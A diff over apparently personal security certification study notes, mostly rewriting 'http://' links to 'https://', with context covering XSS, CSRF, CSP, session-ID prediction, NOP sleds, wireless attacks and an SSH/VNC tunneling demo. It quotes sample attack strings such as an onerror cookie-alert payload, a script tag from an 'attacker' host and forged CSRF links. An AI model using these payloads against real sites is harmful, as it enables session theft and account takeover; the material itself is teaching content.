 XSS attempts pop up all over the place in in all sorts of formats.
 One of the classic attacks: getting access to “document.cookie” and
 sending it to a remote host.
@@ -22148,7 +22148,7 @@ XSS can be used to perform badness on a target server. bring a target down with 
 send an XSS attack via e-mail?
 having the injected script remain permanently on the target server (like in a database, message forum, visitor log, or comment field)?
 (stored XSS, a.k.a. persistent or Type-I XSS). 1,855
-<img src="http://url.to.file.which/not.exist"
+<img src="https://url.to.file.which/not.exist"
 onerror=alert(document.cookie);>
    alert()
 - <META HTTP-EQUIV="refresh"CONTENT="0;url=data:text/html;
@@ -22159,7 +22159,7 @@ onerror=alert(document.cookie);>
 That PHP session ID that identifies the user to the website stolen
 through an XSS? Well, the attacker has it now and can masquerade as the user all day, plugged into a session.
 XSS attacks can vary by application and by browser and can range from nuisance to severe impact, depending on what the attacker chooses to do.
-RSnake and http://hackers.org/xss.html are authoritative sources for XSS attacks.
+RSnake and https://hackers.org/xss.html are authoritative sources for XSS attacks.
 How to Determine Vulnerable
 - perform a security review of the code
 - search for all places where input from an HTTP request could
@@ -22231,7 +22231,7 @@ For each of these, specific rules must be followed so that the user input cannot
      HTML attribute value
     <input value="userInput">
    URL query value
-   http://example.com/?parameter=userInput
+   https://example.com/?parameter=userInput
    CSS value
    color: userInput
    JavaScript value
@@ -22380,12 +22380,12 @@ page:
   - With a properly defined CSP
    - <html>
 Latest comment:
-<script src="http://attacker/malicious‐script.js"></script>
+<script src="https://attacker/malicious‐script.js"></script>
   - </html> policy
   - the browser would not load
 and
 execute malicious‐script.js
-  - because http://
+  - because https://
 attacker/ not be in the set
 of trusted sources.
   - Even though the website failed
@@ -22451,7 +22451,7 @@ Using 'unsafe‐i
 - An example policy
 nline' and 'unsa fe‐eval' is the only way to allow them.
    - Content‐Security‐Policy: script‐src 'self'
-scripts.example.com; media‐src 'none'; img‐src *;  default‐src 'self' http://
+scripts.example.com; media‐src 'none'; img‐src *;  default‐src 'self' https://
 *.example.com
   - In this example policy, the page is subject to the following restrictions:
   - Scripts can be downloaded only from the host serving the page and from scripts.example.com.
@@ -22549,9 +22549,9 @@ print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
 ?> </body>
 </html>
 1. try:
-  - http://testsite.test/file_which_not_exist 2. In response we get:
+  - https://testsite.test/file_which_not_exist 2. In response we get:
   - Not found: /file_which_not_exist 3. force the error page to include our code:
-  - http://testsite.test/<script>alert("TEST");</script>
+  - https://testsite.test/<script>alert("TEST");</script>
 4. The result is:
 5. We have successfully injected the code, may use this to steal user’s session cookie.
 CSRF Explained
@@ -22612,7 +22612,7 @@ Welcome to the “auction” portal. Buyer beware!
 And the malicious Request information is as follows:
 HTTP/1.0
 Accept: text/html, application/xhtml+xml, */*
-Referer: http://www.malicioussite.com/sampleauction.html Accept-Language: en-US
+Referer: https://www.malicioussite.com/sampleauction.html Accept-Language: en-US
 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
 Accept-Encoding: gzip, deflate
 Host: www.somebank.com
@@ -22724,7 +22724,7 @@ account information in another browser tab, takes a screenshot of it, closes the
   - In order for it to work, Evan would need to have recently accessed that website and have a cookie not yet expire.
 Example:
   - how HTML links create action
-  - consider this HTML link: http://www.google.com/
+  - consider this HTML link: https://www.google.com/
 search?q=Success. If users click this link, it works just as if the user browsed to Google and entered Success as a search term. The ?q=Success part of the query causes the action.
          - Many web sites use the same type of HTML queries to perform actions.
   - Example
@@ -22733,12 +22733,12 @@ search?q=Success. If users click this link, it works just as if the user browsed
 the change, and click a button.
   - The web site may use a link like this to perform the
 action:
-http://getcertifiedgetahead.com/edit? action=set&key=email&value=you@home.com.
+https://getcertifiedgetahead.com/edit? action=set&key=email&value=you@home.com.
   - Attackers use this knowledge to create a malicious link.
   - example, the following link could change the email
 address in the user profile, redirecting the user’s email
 to the attacker:
-http://getcertifiedgetahead.com/edit? action=set&key=email&value=hacker@hackersrs.com.
+https://getcertifiedgetahead.com/edit? action=set&key=email&value=hacker@hackersrs.com.
 Many programming languages support XSRF tokens. Example
 Python and Django, two popular web development languages, require the use of an XSRF token in any page that includes a form, these languages call them CSRF tokens.
 This token: a large random number generated each time the form is displayed.
@@ -24220,11 +24220,11 @@ Compromicing Seccion IDs by Predicting Seccion Token
   - ABCD is the constant part,
   - Œ1Œ1fiŒ17 is a date.
   - and the last section is the time.
-   - http://www.example.com/ABCDŒ1Œ1fiŒ171Pfi51Œ
-  - http://www.example.com/ABCDŒ1Œ1fiŒ171P171Œ
-  - http://www.example.com/ABCDŒ1Œ1fiŒ171P175Œ
-  - http://www.example.com/ABCDŒ1Œ1fiŒ171P18fiŒ
-  - http://www.example.com/ABCDŒ1Œ1fiŒ171PfiŒ1Œ
+   - https://www.example.com/ABCDŒ1Œ1fiŒ171Pfi51Œ
+  - https://www.example.com/ABCDŒ1Œ1fiŒ171P171Œ
+  - https://www.example.com/ABCDŒ1Œ1fiŒ171P175Œ
+  - https://www.example.com/ABCDŒ1Œ1fiŒ171P18fiŒ
+  - https://www.example.com/ABCDŒ1Œ1fiŒ171PfiŒ1Œ
    - An attacker may attempt with the following session ID at 1P:Z5:1O
 Compromising Session IDs Using Man-in-the-Middle Attack
 - The process of compromising the session ID using Man-in-the-Middle attack requires splitting of the connection between Victim and Web server into two connections, one of them between Victim-to-Attacker and another between Attacker-to-Server.
@@ -25968,14 +25968,14 @@ based on the manipulation of parameters exchanged
 between client and server in order to modify application data, such as user credentials and permissions, price and quantity of products, etC.
 Usually, this information is stored in cookies, hidden form fields, or URL Query Strings, and is used to increase
 application functionality and control. Example:
-  - bank's online servicing, URL bar: "http:// www.MyPersonalBank.com/account?id=368940911028389& Damount=10980&Camount=21"
+  - bank's online servicing, URL bar: "https:// www.MyPersonalBank.com/account?id=368940911028389& Damount=10980&Camount=21"
   - modify the Damount & Camount values and submit the request
   - data on the web page reflect the changes. nop指令的作用:
 1)就是通過nop指令的填充(nop指令一個字節)，使指 令按字對齊，從而減少取指令時的內存訪問次數。(一般 用來內存地址偶數對齊，比如有一條指令，佔3字節，這
    時候使用 nop 指令，cpu 就可以從第四個字節處讀取指令 了。)
 2)通過nop指令產生一定的延遲，但是對於快速的CPU來 說效果不明顯，可以使用rep前綴，多延遲幾個時鐘;--> 具體應該說是佔用了3個時鐘脈衝! 3)i/o傳輸時，也會用一下 nop，等待緩衝區清空，總線 恢復;
 4)清除由上一個算術邏輯指令設置的flag位; 5)破解:)對於原程序中驗證部分使用nop來填充，使驗 證失效; 6)有一個朋友說的比較厲害--在航天飛機控制程序中 防止程序跳飛! 解釋如下:在空間放射性環境下，放射性子粒很容易使內 存位元改變(呵呵，有點基因突變的感覺)，這樣如果改 變的是 jump，call 指令的存貯位置的話，就會導致程序跳 轉到一個不可以預置的位置，對於關鍵系統來說的確是災 難性的。所以就在被調用程序之前填充 nop 指令，這樣即 使跳轉到稍前或者稍後的位置，也不會造成影響。 這讓我想起《C Traps and Pitfalls》中舉的那個導彈軟件 中的致命錯誤:因爲導彈是以 0.1s 爲單位進行記時的，但 是由於浮點數沒有辦法精確的表示 0.1，造成了舍尾誤差， 這個誤差在導彈開啓 3 天的之後逐漸的積累，結果誤差了 一秒。
-以下來自 http://wapedia.mobi/zh/NOP
+以下來自 https://wapedia.mobi/zh/NOP
 計算機科學中，NOP 或 NOOP(No Operation 或
 No Operation Performed的縮寫，意爲無操作)是彙編語 言的一個指令，一系列編程語句，或網絡傳輸協議中的表
  示不做任何有效操作的命令。
@@ -26080,7 +26080,7 @@ FD STD 清理DF位(DF=0) DF 1. 上面利用XCHG/PUSHL/INC/DEC的方法程序應�
 3. /x90(NOP),/x9b(wait),/xd6(bad) 這三個指令不錯, 都 不會改變程序的流程, 又不會改變寄存器的東東. 這裏尤其指明的是 /xd6 指令, 在 intel 手冊上沒查到對應什 麼指令, 但在 linux 下和 windows 下發現系統對於這個是繼 續
 執行下一條指令,和 NOP 相似. 在我看來,上面這些指令利用順序優先級最好是:
 /x90(NOP) > /xd6 > /x9b > 改變標誌寄存器的操作 指令 > INC/DEC/PUSHL/XCHG
-還有 http://www.zhihu.com/question/21122634 Security Domains
+還有 https://www.zhihu.com/question/21122634 Security Domains
 - layered approach
 ◦ not relying on one single technology to secure your
 information. - defense in depth
@@ -27389,7 +27389,7 @@ Media Access Control (MAC) 48 bits
 ◦ Hexadecimal notation (like 58:55:ca:eb:27:83).
 ◦ The first 24 bits: vendor code.
 ▸ Vendors of networking equipment are assigned one or more unique vendor codes.
-▸ List of vendor codes at http://standards.ieee.org/develop/ regauth/oui/oui.txt
+▸ List of vendor codes at https://standards.ieee.org/develop/ regauth/oui/oui.txt
 ◦ last 24 bits:
 ▸ Each vendor is responsible for using unique values.
 ▸ no two MAC addresses in the world should have the same
@@ -33438,7 +33438,7 @@ VNC, virtual network computing.
   - an application that we install, and gives us a remote graphical desktop to our system.
   - It's most often combined with SSH tunneling to allow secure encrypted graphical connections to remote systems.
 Demo: SSH Tunnels and VNC Installation and Setup Alright, so here we are in a demo, and we're going to look at configuring SSH tunnels for an arbitrary service, and we're also going to look at how to use X11 forwarding, and also installing VNC and connecting to VNC over an SSH tunnel. Alright, so here we are on server1 with an SSH session open to both server1 and server2. Now we're going to start off by tunneling an arbitrary service, and we need an arbitrary service to tunnel, so I'm going to install Apache on server2, but I'm going to leave the firewall blocking such that for server1 to be able to reach server2, we have to configure an SSH tunnel. So let's go ahead and switch over to server2, and begin by installing Apache. So we get to sudo yum install httpd, I'll throw a -y on
- there so that gets in there automatically for us when it gets to the end of the yum download. So with Apache installed, let's go ahead and use systemd to start up our http daemon. Sudo systemctl start httpd, just going to press enter, and we'll check the status of our daemon before we get too far, and there we can see it's up and running and active. Now I'm going to switch over to superuser for a second, with sudo su and then a minus sign, and I want to add a document inside of var/www/html such that we kind of know very easily which server we're working with, and to do that, real easy, I'm going to say echo, say 'hello from server2' redirect that into var/www/html, and I'll put that in at index. html. Just going to press enter, confirm the contents of that file, so we're not chasing our tail too much later, html/index. htm, hello from server2, excellent. So just to prove to you that I have nothing up my sleeve, I'm going to show you the firewall commands to show to you that http is not an allowed service on this system. So we'll use firewall-cmd, we're going to do get active zones, you can see I'm in the public zone, and my interfaces on that zone is the only interface on this server, which is enp0s3, and so let's use firewadll- cmd to look at that zone configuration, so we can say firewall-cmd -- zone=public and we'll do a list-all. So here we can see the only services allowed into this system on server2 are dhcpv6-client, and SSH, http is certainly not open. So now let's go ahead and switch over to server1 and build up our SSH tunnel. So here we are on server1, and I'm going to use a program called curl, which is simply a command line web browser, and I'm going to curl http://server2. psdemo. local, and you can see it says failed connect. That no route to host error is a little misleading, we have a route to the host certainly, but it's failing to connect to port 80 to download that index. html file, which is our default document. So let's go ahead and build up our SSH tunnel together, and we can do that with ssh -L, and the port I'm going to connect to locally, I'm going to use port 8080, and then I'll throw in server2. psdemo. local, and the remote port on server2 that I'm going to connect to is port 80, and again server2. psdemo. local. Let's go ahead and press enter, and you can see here it's asking me for the passphrase to my key, so if you set up public key authentication like we did in a previous demo, use that pass phrase, if you didn't do that demo, simply enter in your password for server2, so let's go ahead and enter in that pass phrase and now you can see I have a shell session to the remote server. So even though I told it to build a tunnel, it still built a shell session to the remote system. We're going to look at an
+ there so that gets in there automatically for us when it gets to the end of the yum download. So with Apache installed, let's go ahead and use systemd to start up our http daemon. Sudo systemctl start httpd, just going to press enter, and we'll check the status of our daemon before we get too far, and there we can see it's up and running and active. Now I'm going to switch over to superuser for a second, with sudo su and then a minus sign, and I want to add a document inside of var/www/html such that we kind of know very easily which server we're working with, and to do that, real easy, I'm going to say echo, say 'hello from server2' redirect that into var/www/html, and I'll put that in at index. html. Just going to press enter, confirm the contents of that file, so we're not chasing our tail too much later, html/index. htm, hello from server2, excellent. So just to prove to you that I have nothing up my sleeve, I'm going to show you the firewall commands to show to you that http is not an allowed service on this system. So we'll use firewall-cmd, we're going to do get active zones, you can see I'm in the public zone, and my interfaces on that zone is the only interface on this server, which is enp0s3, and so let's use firewadll- cmd to look at that zone configuration, so we can say firewall-cmd -- zone=public and we'll do a list-all. So here we can see the only services allowed into this system on server2 are dhcpv6-client, and SSH, http is certainly not open. So now let's go ahead and switch over to server1 and build up our SSH tunnel. So here we are on server1, and I'm going to use a program called curl, which is simply a command line web browser, and I'm going to curl https://server2. psdemo. local, and you can see it says failed connect. That no route to host error is a little misleading, we have a route to the host certainly, but it's failing to connect to port 80 to download that index. html file, which is our default document. So let's go ahead and build up our SSH tunnel together, and we can do that with ssh -L, and the port I'm going to connect to locally, I'm going to use port 8080, and then I'll throw in server2. psdemo. local, and the remote port on server2 that I'm going to connect to is port 80, and again server2. psdemo. local. Let's go ahead and press enter, and you can see here it's asking me for the passphrase to my key, so if you set up public key authentication like we did in a previous demo, use that pass phrase, if you didn't do that demo, simply enter in your password for server2, so let's go ahead and enter in that pass phrase and now you can see I have a shell session to the remote server. So even though I told it to build a tunnel, it still built a shell session to the remote system. We're going to look at an
  example later where we can get around that, but right now, just know that with no options you'll get a shell session, so I'm going to need a new terminal here, so again from terminal I opened up a new terminal and on server1, now if I type curl, but this time I'm not going to point my web browser at server2, I'm going to point it at localhost:8080, right, that's that local port that I'm going to make my request into, it's going to shoot across the tunnel over SSH, and it's going to pop out the remote side on port 80. So here what I should see is hello from server2, right, so it downloaded that document, and curl presented to me the contents of that document via the command line. Now if we wanted to configure remote port forwarding, we simply can go into ssh/sshd_config type in our password, and I'm going to look for something called gateway ports. So here you can see gateway ports, by default it's configured to no, because clearly we wouldn't want to route ports through systems, right, without really knowing that that's going on. If we wanted to configure this, we'd simply uncomment this out, and change that to yes. But I really don't want that, so I'm going to quit without saving this file. Alright, so let's go ahead and clean up some of these terminals here and exit out and leave us with just a connection open to server1. So here we are just on server1, now I'm going to show you how X11 forwarding works, and to do X11 forwarding, I'm going to open a session up to server2, and so I'm going to say ssh -X demo@server2. psdemo. local, just going to press enter, throw in our pass phrase, and now it's going to start forwarding X11 requests from the server back to my client, but I don't have any X programs running yet, so let's go ahead and install some X programs on our remote system. So here on server2, I'm going to type sudo yum install and I'm going to install xorg-x11-apps and I'll throw a -y on there. Let's go ahead and give it our sudo password. And kind of the ubiquitous way to show if X forwarding is working is to use the program called xeyes, so I type in xeyes, and there you can see in the upper left hand corner of my screen is the program xeyes. So let's go ahead and close that, and this is an example of X11 forwarding, so that program, the X11 program, was executing on server2, but its display is being forwarded here to server1. Alright, so after the X11 demo, let's go ahead and exit out of server2, get back on server1, and clear our console. And open up a second window, and let's go ahead and ssh over into server2 again, so we have two windows side by side. And so there we have a server2 window, and a server1 window. So back over on server2, we're going to now go and set up VNC, right, and so we're going to configure a VNC server on server2, and we're going to connect to that from the VNC client on server1. And again, we're going to do this over an SSH tunnel, which is the most common way to do this, right, we really don't want to have VNC wide open on the internet for people to connect to. So on server2, let's go ahead and start off with sudo yum install tigervnc-server again we'll throw a -y on the end, give it our password, and once VNC's installed, we have a couple steps that we have to do to go ahead and get it set up, so bear with me here while I walk through these steps. And the first thing that we need to do is sudo, and we're going to copy a file from usr/lib/systemd/system and we're going to look for a file called vncserver@. service and we're going to take that file and we're going to copy it into /etc/systemd/system/. And let's go ahead and open that file up with a text editor. So let's open up systemd/system/ and that's going to be vncserver@. service. Now once this is open up, page down a little bit, and it's going to be pretty obvious what we need to change. The two things that we need to change, right off the bat, are we run VNC as an individual user because what's going to happen is we're going to start up this VNC service, and it needs to start a desktop as somebody, and in this case, it's going to be our user demo. Now underneath here, we need to also tell the PIDFile where it's going to reside, and that's going to be in our home directory, so we're going to go ahead and do /home/demo. Now the window that I'm executing in right now is kind of low resolution, so that I can pick up a good quality for you guys in a video so by default, I believe the geometry for the resolution of a VNC session is bigger than the resolution that I have right now. So for you guys, I'm going to add geometry, and then a space, and I'm just going to say 800x600. So I'm kind of clamping down that resolution so when we do this later, it just doesn't run off the screen. So you can set this resolution to whatever you guys like, so let's go ahead and save this file out with a right and a quit, and we're back at a command prompt. So since we did make it edit to a systemd unit, we need to tell systemd about that, and so we can do that with a sudo systemctl and that's going to be a daemon-reload. Let's go ahead and press enter, and it's going to reread that configuration file. Now again, this is all happening on server2, right, so we also need to add a VNC password for our VNC session, so it's another thing that VNC needs when you connect to it. So when we come over on server1, and we do make a connection attempt to server2, it will still challenge us for a password, and it's going to be its own password, it's going to be a VNC password, right, just what you needed, another password. So we say vncpasswd, and you press enter, and let's go ahead and type in a password. And there you go. So back at the command prompt, all that's left to do on server2 for the service startup of VNC is to start up the service, and it can do that with a sudo systemctl start and it's going to be a vncserver and this is where the syntax gets a little weird, where it's going to be an at sign, then a colon, the number 1, and then the unit type dot service. And so what we're doing here is we're telling vncserver to start up a console on this first interface, or colon 1, right, and then the dot is just simply the service type. So let's go ahead and press enter and cross our fingers. Alright, so if you see this error here where it says resource limit exceeded, let me show you how to fix this up and it's actually a bug in the later releases of CentOS, and I think around late December of 2016 this got resolved, but let's go ahead and show you how to clean this up. So if we switch over into the temp directory, if we do an ls -la, you can see there's some xfiles laying around. So let's go ahead and remove those, so we do a sudo rm and I'm going to remove X0. lock, then I'm going to remove X2. lock, and I'm also going to remove that. X11 directory. And we'll have to throw a -rf on there to get rid of the condense. Alright, let's go back out here, now what's interesting is, and I'll show you guys, is that VNC actually started, right, we can see our VNC process there. The error that we got when we started the VNC service was actually a false positive, because you can see clearly with the syntax here that XVNC is running, server2. psdemo. local and it's on the geometry 800x600, right, so it read our configuration, so I'm going to go ahead and kill that one, 12505, and I'm going to start my service again. And this time we shouldn't get an error, and we don't. So now we know that our service for VNC server is up and running, we can confirm that with status, so systemctl status, and we can see it's active and running. Now another way that we can confirm that VNC is up and running is we could check to see if it's listening on its TCP port, and we can use the command ss and we use -lt4 to list all of our listening sockets on this computer, and you can see right there at the top is *:5901. And just so you know there's nothing up my sleeve, when we did the demo earlier, when I showed you the firewall configuration for http, the only things that were open on this firewall were dhttpv6-client and ssh, so we know that 5901 is not an available service on server2 here.
 Demo: Connecting to VNC Over and SSH Tunnel So before we jump over to server1 for testing, I'm going to disable the firewall cause I want to show you guys how VNC works without tunneling, and then we'll come back and do it with tunneling. So VNC server's all up and running, let's go ahead and do sudo systemctl stop firewalld not a good thing to do on a production system, but this is just a demonstration. So let's jump over to server1 and get our VNC client installed. And we can do that with sudo yum install tigervnc. The other package that we installed on server2 was tigervnc-server, this is just tigervnc, which is just the client. Let's go ahead and give it our sudo password, it's going to bring down that package for installation. So now on the client side, I'm going to go ahead and use the VNC viewer to connect to the remote desktop on the un-firewalled port 5901. And we do that with the program vncviewer, and then it's going to be a parameter of our server name, psdemo. local, and now remember when we starred at that :1 on the service unit on server2, this is where that comes into play, so I put :1 right here because that's the VNC service that it's going to connect to. We can run multiple servers, and multiple graphical desktops on server2, but this is a way to uniquely identify those. And on the remote side, when we saw 5901, the ports increase as well as the number of the vnc service increases. So let's go ahead and press enter. And now we're presented with a password for authentication, and this is going to be the vnc password that we entered on server2, so just going to enter that, and press enter, let's enter it one more time, for our GNOME session, and there you go, you can see we now have a graphical desktop over to server2, see demo@server2. So let's go ahead and close this cause we're certainly never going to do it this way. We're going to go back over to server2, and we're going to start our firewall, and we're going to use SSH tunneling to make a connection to this port. So back over on server1, earlier when I showed you SSH tunneling, it gave me a shell. This time I'm going to show you the syntax such that it won't create a shell, and you can background the SSH tunneling process. So ssh -L for our local port, I'm going to use our local port as 5901 just so that it matches, and it's pretty easy to remember, server2. psdemo. local, that's going to go to the remote port, which is also 5901, on server2. psdemo. local, throw a -N on the end. Now what this is going to do is not open a session, or terminal session, to the remote server, it's just going to create the tunnel for me. So here is the request for my pass phrase, so now that's up and running, right. So I can use the bash shortcut control-z to stop that process and use bg to background that tunnel, so that tunnel's up and running now, it's just a backgrounded task, and I still have a session open to server1 rather than a session open to server2, which I did in that previous demo. So now I can type vncviewer again, but this time I'm not going to use server2. psdemo. local, I'm going to use localhost, and the local port is going to be 5901, so let's go ahead and press enter, and there you can see I'm challenged for my password again, and I get immediately back into the session that I had on my VNC server, because before when I had logged in to VNC to highlight that it was server2, I opened up the terminal, and you guys saw that. So this is a persistent, right, so I can come in and out of this VNC session as needed. Now the critical thing here is this is a great remote access method if your tunneling is over SSH, so you want to make sure that you keep these things secure and encrypted.
 Module Overview and Course Wrap Up! Well here we are at the end of the module, and we've covered several SSH programs and how to use them, specifically how to move or copy files with SCP. We also learned how we can leverage SSH for remote command execution, and some basics on how to build tunnels between systems for secure access. We also learned how to get graphical consoles on remote systems with both X11 and VNC. So here we are at the end of the course, I hope you enjoyed listening to this, and that we've laid the appropriate foundation for your LFCE studies. We've covered a lot of ground so far together, we've covered Linux security and architectures, we dove deep into firewalling with IP tables in firewalld, and we also learned how to access our systems remotely with SSH, and some very cool tools and techniques. It's truly been a pleasure recording this course for you. I thank you for listening and, most importantly, learning with me, I hope you enjoyed the course, and join me again here soon, again at Pluralsight.
@@ -33790,8 +33790,8 @@ automated attacks and threats:
   - DNS cache poisoning: a pharming attack, changing a host’s DNS
 cache to create a falsified domain-name/IP-address association.
 IDS Evasion Techniques
-- "A look at whisker's anti-IDS tactics" by Rain Forest Puppy (http://www.apachesecurity.net/ archive/whiskerids.html)
-- "IDS Evasion Techniques and Tactics" by Kevin Timm (http://www.securityfocus.com/ printable/infocus/1577)
+- "A look at whisker's anti-IDS tactics" by Rain Forest Puppy (https://www.apachesecurity.net/ archive/whiskerids.html)
+- "IDS Evasion Techniques and Tactics" by Kevin Timm (https://www.securityfocus.com/ printable/infocus/1577)
 Brief Overview
 From CIDF to RFC 4765
   - Common Intrusion Detection Framework (CIDF)
@@ -36193,7 +36193,7 @@ server and serving the pages returned by the web server.
 - Benifit: This configuration: allows the web server to be located in the private
 network behind a second firewall.
 Example:
-- Bart wants to access http://gcgapremium.com.
+- Bart wants to access https://gcgapremium.com.
 - He types the URL into his browser and it connects to the reverse proxy
 server.
 - The reverse proxy server connects to the web server and retrieves the web
@@ -36365,7 +36365,7 @@ VLANs can logically separate computers or logically group computers regardless o
 Routers use rules within ACLs as an antispoofing method. Border firewalls block all traffic coming from private IP addresses.
 SNMPv3 is used to monitor and configure network devices and uses notification messages known as traps. It uses strong authentication mechanisms and is preferred over earlier versions. SNMP uses UDP ports 161 and 162.
 Online References
-Remember, the online content includes some extras, such as labs, performance- based question examples, and more. Check it out at http://gcgapremium.com/501- extras.
+Remember, the online content includes some extras, such as labs, performance- based question examples, and more. Check it out at https://gcgapremium.com/501- extras.
  S+4th: ch12 Disaster Recovery and Incident Response
 Vulnerability Scanning
 Vulnerability scanning:
@@ -36635,7 +36635,7 @@ When it comes to hacking wireless networks, the truly great news is you may not 
 Finding wireless networks to hack.
 - finding any wireless network—that’s too easy.
 - But find the wireless network you’re looking for—the one that’s going to get your team inside the target and provide you with access to all the goodies.
-war driving: use of a service such as WIGLE (http://wigle.net) and to get a glimpse into someone’s smartphone.
+war driving: use of a service such as WIGLE (https://wigle.net) and to get a glimpse into someone’s smartphone.
 WIGLE users register with the site and use NetStumbler in their cars, with an antenna and a GPS device, to drive around and mark where wireless networks can be found. Smartphones generally retain identifiers and connection details for networks their owners connect to.
 War flying: involves airplanes. the wireless adapter.
 - No matter how great the tool is, if the wireless adapter can’t pull the frames out of the air in the correct manner, all is lost.
@@ -36652,12 +36652,12 @@ captured file across the wireless network.
 - Also, many will have independent connectors for transmit and receive antennas, which makes this all the more fun and effective.
 Barring this, research and download new and different drivers for your
  particular card.
-- The madwifi project may be an answer for you (http://madwifi-
+- The madwifi project may be an answer for you (https://madwifi-
 project.org).
 - At any rate, much like the ability of wired adapters to use promiscuous mode for your sniffing efforts, not all wireless adapters are created equal, and not all will work with your favorite tool. Be sure to check the user guides and man pages for lists and tips on correctly configuring your adapters for use.
 NOTE Although people often expect any wireless card to do the trick, it simply won’t, and frustration begins before you ever get to sniffing traffic, much less hacking. I have it on good authority that, in addition to those mentioned, Ubiquiti cards (www.ubnt.com/) may be the top-tier card in this realm.
 Network discovery tool
-I’ve already made mention of WIGLE (http://wigle.net) and how mapped out wireless network locations using GPS and a tool called NetStumbler.
+I’ve already made mention of WIGLE (https://wigle.net) and how mapped out wireless network locations using GPS and a tool called NetStumbler.
 - NetStumbler (www.netstumbler.com): can be used for identifying poor coverage locations within an ESS, detecting interference causes, and finding any rogue access points in the network.
 - Windows based, compatible with 802.11a, b, and g.  Kismet: another wireless discovery option.
 - wireless packet analyzer/sniffer
@@ -37078,7 +37078,7 @@ Many wireless routers provide it for initial connection.
   - This means: first connection, you only need the PIN to connect.
 Convenient but dangerous.
   - The WPS attack: intercept that PIN in transmission, connect to the WAP, steal the WPA2 password.
-  - 由Wi-Fi联盟(http://www.wi-fi.org/)组织实施的认证项目，简化 无线网络的安全加密设置。
+  - 由Wi-Fi联盟(https://www.wi-fi.org/)组织实施的认证项目，简化 无线网络的安全加密设置。
   - 在传统方式下，用户新建一个无线网络时，必须在接入点手动设 置网络名(SSID)和安全密钥，然后在客户端验证密钥以阻止 “不速之客”的闯入。
   - Wi-Fi Protected Setup能帮助用户自动设置网络名(SSID)、配置 最高级别的WPA2安全密钥，具备这一功能的无线产品往往在机 身上设计有一个功能键，称为WPS按钮，用户只需轻轻按下该按 钮或输入PIN码，再经过两三步简单操作即可完成无线加密设 置，同时在客户端和路由器之间建立起一个安全的连接。
 WEP encryption 有线等效加密
@@ -40798,7 +40798,7 @@ SP 800-53 Revision 4, “Security and Privacy Controls for Federal Information S
   - the Access Control family (AC) includes 25 different groups (AC-1 through AC-25).
   - The Account Management group (AC-2) describes 110 individual security controls related to account management.
 - It’s worth noting that SP 800-53 Revision 3 attempted to identify every control as technical, management, or operational. However, many controls included characteristics from more than just one of these classifications. NIST removed these references in Revision 4.
-- SP 800-53 Revision 4 and other SP 800 documents at http://csrc.nist.gov/ publications/PubsSPs.html.
+- SP 800-53 Revision 4 and other SP 800 documents at https://csrc.nist.gov/ publications/PubsSPs.html.
   Boundary protection:
 - First line defense:
   - Natural terrain 地形
@@ -42633,10 +42633,10 @@ The IDEA algorithm is patented by its Swiss developers. However, they have grant
 blocks, AES encrypts data in 128-bit blocks. - Mr. Schneier released Blowfish for public use with no license required.
 - Blowfish encryption is built into a number of commercial software products and operating systems.
 - A number of Blowfish libraries are also available for software developers.
-http://wemedia.ifeng.com/76674795/wemedia.shtml
+https://wemedia.ifeng.com/76674795/wemedia.shtml
 https://my.oschina.net/u/3664884/blog/1607425
 https://blog.csdn.net/findmyself_for_world/article/details/50222081
-http://blog.51cto.com/yinghao/563302
+https://blog.51cto.com/yinghao/563302
 Twofish
 The Twofish algorithm developed by Bruce Schneier (also the creator of Blowfish) was another one of the AES finalists.
 - a block cipher.
@@ -42705,7 +42705,7 @@ The initial state X0 is the XOR of the plaintext P with the key K: X0 = P XOR K.
 3. MixColumns step: a matrix multiplication 矩阵乘法 step.
 4. AddRoundKey step: an XOR step with a round key derived from the 128-bit encryption key.
 Java AES Encryption Example
-Source: http://java.sun.com/javase/6/docs/technotes/guides/security/crypto/ CryptoSpec.html
+Source: https://java.sun.com/javase/6/docs/technotes/guides/security/crypto/ CryptoSpec.html
 Generate an AES key
 KeyGenerator keygen = KeyGenerator.getInstance("AES"); SecretKey aesKey = keygen.generateKey();
 Create a cipher object for AES in ECB mode and PKCS5 padding
@@ -44119,7 +44119,7 @@ CAs are trusted: by placing a copy of their root certificate into a trusted root
   - This way, any certificates that they sell to businesses areautomatically
 trusted.
 shows the Trusted Root Certification Authority store on a Windows computer.
-You can see that there are many certificates from many different CAs. In the figure, I’ve selected one of the certificates from COMODO Certification Authority. One of the labs for this chapter (available at http://gcgapremium.com/501labs) shows how to access this on a Windows computer.
+You can see that there are many certificates from many different CAs. In the figure, I’ve selected one of the certificates from COMODO Certification Authority. One of the labs for this chapter (available at https://gcgapremium.com/501labs) shows how to access this on a Windows computer.
   The most common trust model:
 hierarchical trust model, centralized trust model.
 - In this model, the public CA creates the first CA, root CA.
@@ -44708,7 +44708,7 @@ Music DRM
 The music industry has battled pirates for years, dating back to the days of homemade cassette tape duplication and carrying through compact disc and digital formats.
 Music distribution companies attempted to use a variety of DRM schemes, but most backed away from the technology under pressure from consumers. The use of DRM for purchased music slowed dramatically when, facing this opposition, Apple rolled back their use of FairPlay DRM for music sold through the iTunes Store. Apple co-founder Steve Jobs foreshadowed this move when, in 2007, he issued an open letter to the music industry calling on them to allow Apple to sell DRM-free music. That letter read, in part:
 The third alternative is to abolish DRMs entirely. Imagine a world where every online store sells DRM-free music encoded in open licensable formats. In such a world, any player can play music purchased from any store, and any store can sell music which is playable on all players. This is clearly the best alternative for consumers, and Apple would embrace it in a heartbeat. If the big four music companies would license Apple their music without the requirement that it be protected with a DRM, we would switch to selling only DRM-free music on our iTunes store. Every iPod ever made will play this DRM-free music.
-The full essay is no longer available on Apple’s website, but an archived copy may be found at http://bit.ly/1TyBm5e.
+The full essay is no longer available on Apple’s website, but an archived copy may be found at https://bit.ly/1TyBm5e.
 Currently, the major use of DRM technology in music is for subscription-based services such as Napster and Kazaa, which use DRM to revoke a user’s access to downloaded music when their subscription period ends.
 Do the descriptions of DRM technology in this section seem a little vague? There’s a reason for that: manufacturers typically do not disclose the details of their DRM functionality due to fears that pirates will use that information to defeat the DRM scheme.
 Movie DRM
@@ -45133,7 +45133,7 @@ Properties of page in previous slide
 bar
 URL escape character attack
   - Old versions of Internet Explorer did not display anything past the Esc or null character。
-  - Displayed vs. actual site http://trusted.com%01%00@malicious.com
+  - Displayed vs. actual site https://trusted.com%01%00@malicious.com
 Unicode attack
   - Domains names with Unicode characters can be registered
   - Identical, or very similar, graphic rendering for some characters
@@ -45166,10 +45166,10 @@ Event handlers embedded in HTML
 <img src="picture.gif"
     onMouseOver="javascript:hello()">
 Built-in functions can change content of
